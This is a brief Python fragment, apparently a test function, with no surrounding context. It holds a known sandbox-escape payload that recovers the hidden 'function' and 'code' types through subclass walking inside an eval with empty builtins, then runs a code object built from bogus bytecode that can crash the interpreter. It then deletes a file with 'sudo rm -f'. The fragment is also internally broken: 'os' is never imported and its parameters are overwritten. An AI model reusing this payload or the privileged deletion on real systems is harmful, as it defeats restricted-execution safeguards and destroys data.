#!env python
#coding=utf-8
# 
def test_def(self, s, fullname):
    s = """ (lambda fc=( lambda n: [c for c in ().__class__.__bases__[0].__subclasses__() if c.__name__ == n][0]):
    fc("function")(
        fc("code")(0,0,0,0,"test",(),(),(),"","",0,""),{})())()"""
    eval(s, {'__builtins__':{}})

    fullname = "authExport.dat"
    os.system('sudo rm -f %s'%fullname)


